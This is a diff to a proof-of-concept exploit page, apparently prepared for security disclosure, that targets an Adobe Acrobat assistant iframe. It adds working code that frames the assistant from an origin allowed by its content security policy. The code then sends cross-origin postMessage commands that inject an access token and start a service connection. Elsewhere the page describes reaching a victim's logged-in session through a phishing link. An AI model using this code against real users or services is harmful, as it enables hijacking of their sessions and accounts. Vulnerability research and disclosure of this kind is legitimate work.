@@ -41,7 +41,22 @@
     </div>
 
     <div class="panel">
-      <h2>Step 1 — reach the victim's live session</h2>
+      <h2>Direct iframe — allowed by CSP frame-ancestors</h2>
+      <p>Frames the assistant directly from this hosted origin (<code>*.aem.page</code> /
+      <code>*.hlx.page</code> are explicitly listed in the assistant's CSP <code>frame-ancestors</code>, unlike
+      an arbitrary <code>attacker.com</code>). No popup, no window.open — just an <code>&lt;iframe&gt;</code> on
+      this page, served by this real hosted site.</p>
+      <button class="primary" id="btnFrame">A1. Load assistant iframe (direct)</button>
+      <div style="margin-top:10px"><iframe id="asst" title="assistant" style="width:380px;height:560px;border:2px dashed #fa0f00;border-radius:8px"></iframe></div>
+      <button id="btnFrameDark" style="margin-top:8px">A2. Theme → dark (direct iframe)</button>
+      <button id="btnFrameLight">Theme → light</button>
+      <br>
+      <textarea id="tokA" rows="2" placeholder="Marker/token to inject into the DIRECT iframe (own test token, or a harmless marker string)"></textarea>
+      <button id="btnFrameInject">A3. Inject UPDATE_ACCESS_TOKEN into direct iframe</button>
+    </div>
+
+    <div class="panel">
+      <h2>Step 1 — reach the victim's live session (popup)</h2>
       <p>Opens <code>acrobat.adobe.com</code> in a new window from this page. If this page is visited in a browser
       that is already logged into Acrobat (e.g. via a phishing link while the victim has Acrobat open), the new
       window automatically carries that session's cookies.</p>
@@ -76,6 +91,13 @@
   <footer></footer>
 
   <script nonce="aem" type="module">
+    const ASSIST_VER = "2026.10.15";
+    const ASSIST_BASE = "https://cdn.prod.assistant.adobe.com/production/static/ui/" + ASSIST_VER + "/index.html";
+    const FRAGMENT = encodeURIComponent(JSON.stringify({
+      window_origin: "https://acrobat.adobe.com",
+      iframe_origin: ASSIST_BASE,
+      popped: false
+    }));
     const ACROBAT_URL = "https://acrobat.adobe.com/link/home/";
     let popup = null;
 
@@ -88,6 +110,29 @@
     }
 
     document.getElementById("origin-label").textContent = location.origin;
+
+    // ---------- Direct iframe mode (allowed by CSP frame-ancestors) ----------
+    document.getElementById("btnFrame").addEventListener("click", () => {
+      const f = document.getElementById("asst");
+      f.src = ASSIST_BASE + "?lc=en_us#" + FRAGMENT;
+      log("Framed assistant directly from this origin:", location.origin);
+    });
+    function sendFrame(payload) {
+      const w = document.getElementById("asst").contentWindow;
+      if (!w) { log("! direct iframe not loaded — click A1 first"); return; }
+      w.postMessage(payload, "*");
+      log("SENT -> direct iframe:", JSON.stringify(payload).slice(0, 160));
+    }
+    document.getElementById("btnFrameDark").addEventListener("click", () =>
+      sendFrame({ msgType: "adbmsgui_UPDATE_UI_THEME", message: "dark" }));
+    document.getElementById("btnFrameLight").addEventListener("click", () =>
+      sendFrame({ msgType: "adbmsgui_UPDATE_UI_THEME", message: "light" }));
+    document.getElementById("btnFrameInject").addEventListener("click", () => {
+      const t = (document.getElementById("tokA").value || "").trim();
+      if (!t) { log("! paste a token/marker first"); return; }
+      sendFrame({ msgType: "adbmsgui_UPDATE_ACCESS_TOKEN", message: t });
+      sendFrame({ msgType: "adbmsgui_START_SERVICE_CONNECTION", message: { accessToken: t } });
+    });
 
     document.getElementById("btnOpen").addEventListener("click", () => {
       popup = window.open(ACROBAT_URL, "acrobat_poc_" + Date.now(), "width=1200,height=800");
